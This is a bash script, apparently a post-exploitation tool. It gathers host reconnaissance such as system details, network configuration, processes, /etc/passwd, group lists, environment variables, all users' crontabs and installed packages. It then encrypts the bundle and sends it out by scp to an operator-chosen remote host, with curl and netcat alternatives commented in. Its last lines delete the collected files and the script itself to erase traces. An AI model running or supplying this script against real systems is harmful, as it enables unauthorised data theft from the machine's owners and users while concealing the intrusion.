#!/bin/bash

# Configurable options
passphrase="passphrase"  # Replace with your actual encryption passphrase
your_user="user"  # Replace with your actual remote host username
your_ip="your-ip"  # Replace with your actual remote host IP
your_port="your-port"  # Replace with your actual remote host port
your_key="$HOME/.ssh/your_key" # Replace with your actual SSH key

# Create a unique directory for this run
dir="/tmp/info_$(date +%s)"
mkdir -p ${dir}

# Get system info
{
    echo
    echo "=== System Information ==="
    uname -a
    echo
    echo "=== IP Addresses ==="
    ip addr
    echo
    echo "=== IP Routing Table ==="
    ip route
    echo
    echo "=== Socket Statistics ==="
    ss -tuln
    echo
    echo "=== Process List ==="
    ps aux
    echo
    echo "=== User Accounts ==="
    cat /etc/passwd
    echo
    echo "=== Group Information ==="
    cat /etc/group
    echo
    echo "=== Enabled System Services ==="
    systemctl list-unit-files --state=enabled
    echo
    echo "=== Disk Usage ==="
    df -h
    echo
    echo "=== Memory Usage ==="
    free -h
    echo
    echo "=== CPU Information ==="
    lscpu
    echo
    echo "=== Environment Variables ==="
    printenv
} > ${dir}/system_info.txt

# Get crontab entries
echo
echo "=== Crontab Entries ===" >> ${dir}/system_info.txt
for crontab_user in $(cut -f1 -d: /etc/passwd); do 
    echo "User: ${crontab_user}" >> ${dir}/system_info.txt
    crontab -l -u ${crontab_user} 2>/dev/null >> ${dir}/system_info.txt
done

# List all installed packages
echo
echo "=== Installed Packages ===" >> ${dir}/system_info.txt
if [ -f /etc/debian_version ]; then
    # Debian-based systems (includes Ubuntu)
    dpkg --get-selections >> ${dir}/system_info.txt
elif [ -f /etc/redhat-release ]; then
    # Red Hat-based systems (includes CentOS, Fedora)
    rpm -qa >> ${dir}/system_info.txt
elif [ -f /etc/arch-release ]; then
    # Arch Linux
    pacman -Q >> ${dir}/system_info.txt
elif [ -f /etc/gentoo-release ]; then
    # Gentoo Linux
    equery list '*' >> ${dir}/system_info.txt
elif [ -f /etc/SuSE-release ]; then
    # SuSE Linux
    rpm -qa >> ${dir}/system_info.txt
elif [ -x "$(command -v pkg)" ]; then
    # FreeBSD
    pkg info >> ${dir}/system_info.txt
elif [ -x "$(command -v port)" ]; then
    # MacOS
    port installed >> ${dir}/system_info.txt
elif [ -x "$(command -v brew)" ]; then
    # MacOS with Homebrew
    brew list --versions >> ${dir}/system_info.txt
fi

# Get the hostname
hostname=$(uname -n)

# Tar, gzip, and encrypt the directory
tar czf info_${hostname}.tar.gz -C ${dir} .
openssl aes-256-cbc -salt -in info_${hostname}.tar.gz -out info_${hostname}.tar.gz.enc -pass pass:${passphrase} -pbkdf2 -iter 100000

# Exfiltrate the data

# Using scp (default method)
scp -i ${your_key} -P ${your_port} info_${hostname}.tar.gz.enc ${your_user}@${your_ip}:~

# Using curl (uncomment to use)
# curl -F 'file=@info.tar.gz.enc' http://${your_ip}:${your_port}/

# Using netcat (uncomment to use)
# nc ${your_ip} ${your_port} < info.tar.gz.enc

# Remove the directory, tarballs, and the script itself
rm -rf ${dir} info_${hostname}.tar.gz info_${hostname}.tar.gz.enc
rm -- "$0"